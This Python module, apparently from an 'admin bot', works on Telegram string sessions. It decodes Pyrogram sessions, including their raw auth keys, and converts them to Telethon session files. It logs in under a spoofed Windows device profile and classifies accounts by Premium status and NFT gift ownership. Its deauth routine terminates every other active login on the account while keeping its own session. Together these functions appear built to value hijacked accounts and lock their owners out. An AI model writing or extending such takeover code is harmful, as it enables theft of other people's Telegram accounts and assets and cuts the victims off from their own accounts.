"""Session utilities for the admin bot.

* Parse a Pyrogram (pyrogrammod) string session — supports all three
  historical formats.
* Convert it into a Telethon-compatible ``.session`` SQLite file.
* Classify an account live (username / Premium / NFT).
* Deauth: terminate every OTHER active authorization while keeping the
  bot's own freshly-created session alive (Telegram account.resetAuthorization).
"""
import os
import struct
import base64
import asyncio

from pyrogram import Client
from pyrogram.raw.functions.payments import GetSavedStarGifts
from pyrogram.raw.functions.account import GetAuthorizations, ResetAuthorization
from pyrogram.raw.types import InputPeerSelf

from telethon.sessions import SQLiteSession
from telethon.crypto import AuthKey

from adminconfig import API_ID, API_HASH, logger

# ---- Pyrogram string-session binary formats ----
_OLD_FMT      = ">B?256sI?"   # dc_id, test_mode, auth_key, user_id(32), is_bot
_OLD_FMT_64   = ">B?256sQ?"   # dc_id, test_mode, auth_key, user_id(64), is_bot
_NEW_FMT      = ">BI?256sQ?"  # dc_id, api_id, test_mode, auth_key, user_id(64), is_bot
_SIZE_OLD     = 351
_SIZE_OLD_64  = 356

# ---- Telegram production data-center IPs (IPv4, port 443) ----
_DC_IP = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}


def parse_pyrogram_session(session_string: str) -> dict:
    """Decode a Pyrogram string session into its raw components."""
    s = session_string.strip()
    pad = s + "=" * (-len(s) % 4)
    raw = base64.urlsafe_b64decode(pad)

    if len(s) == _SIZE_OLD:
        dc_id, test_mode, auth_key, user_id, is_bot = struct.unpack(_OLD_FMT, raw)
        api_id = None
    elif len(s) == _SIZE_OLD_64:
        dc_id, test_mode, auth_key, user_id, is_bot = struct.unpack(_OLD_FMT_64, raw)
        api_id = None
    else:
        dc_id, api_id, test_mode, auth_key, user_id, is_bot = struct.unpack(_NEW_FMT, raw)

    return {
        "dc_id":     dc_id,
        "api_id":    api_id,
        "test_mode": test_mode,
        "auth_key":  auth_key,
        "user_id":   user_id,
        "is_bot":    is_bot,
    }


def build_session_file(session_string: str, out_basepath: str) -> str:
    """Write a Telethon ``.session`` SQLite file. Returns the file path."""
    info = parse_pyrogram_session(session_string)
    dc_id = info["dc_id"]
    ip = _DC_IP.get(dc_id, _DC_IP[2])

    sess = SQLiteSession(out_basepath)   # Telethon appends ".session"
    sess.set_dc(dc_id, ip, 443)
    sess.auth_key = AuthKey(data=info["auth_key"])
    sess.save()
    sess.close()
    return out_basepath + ".session"


def _make_client(tag: str, session_string: str) -> Client:
    return Client(
        tag,
        session_string=session_string,
        api_id=API_ID, api_hash=API_HASH,
        in_memory=True, no_updates=True,
        device_model="PC 64bit",
        system_version="Windows 11",
        app_version="4.16.3",
    )


async def _has_nft_gift(client: Client) -> bool:
    """True if the account owns at least one unique (NFT) star gift."""
    try:
        res = await client.invoke(
            GetSavedStarGifts(peer=InputPeerSelf(), offset="", limit=100)
        )
        for saved in getattr(res, "gifts", []) or []:
            gift = getattr(saved, "gift", None)
            if type(gift).__name__ == "StarGiftUnique":
                return True
    except Exception as e:
        logger.debug(f"[classify] NFT probe failed: {e}")
    return False


async def classify_account(session_string: str, tag: str = "scan") -> dict:
    """Connect once and read username, Premium flag and NFT ownership."""
    info = {
        "session":    session_string,
        "user_id":    None,
        "username":   None,
        "name":       None,
        "phone":      None,
        "is_premium": False,
        "is_nft":     False,
        "category":   "regular",
        "ok":         False,
        "error":      None,
    }
    client = _make_client(f"cls_{tag}", session_string)
    try:
        await client.start()
        me = await client.get_me()
        info["user_id"]    = me.id
        info["username"]   = me.username
        info["name"]       = me.first_name or ""
        info["phone"]      = getattr(me, "phone_number", None)
        info["is_premium"] = bool(getattr(me, "is_premium", False))
        info["is_nft"]     = await _has_nft_gift(client)
        info["ok"]         = True
    except Exception as e:
        info["error"] = str(e)
        logger.warning(f"[classify] session failed: {e}")
    finally:
        try:
            await client.stop()
        except Exception:
            pass

    if info["is_nft"]:
        info["category"] = "nft"
    elif info["is_premium"]:
        info["category"] = "premium"
    else:
        info["category"] = "regular"
    return info


async def deauth_all_others(session_string: str) -> dict:
    """Terminate every OTHER authorization; keep this (bot) session alive."""
    result = {
        "ok":         False,
        "terminated": 0,
        "username":   None,
        "error":      None,
    }
    client = _make_client("deauth", session_string)
    try:
        await client.start()
        me = await client.get_me()
        result["username"] = me.username or me.first_name

        auths = await client.invoke(GetAuthorizations())
        killed = 0
        for auth in auths.authorizations:
            if getattr(auth, "current", False):
                continue  # never kill our own live session
            try:
                await client.invoke(ResetAuthorization(hash=auth.hash))
                killed += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                logger.debug(f"[deauth] reset hash failed: {e}")
        result["terminated"] = killed
        result["ok"] = True
    except Exception as e:
        result["error"] = str(e)
        logger.warning(f"[deauth] failed: {e}")
    finally:
        try:
            await client.stop()
        except Exception:
            pass
    return result
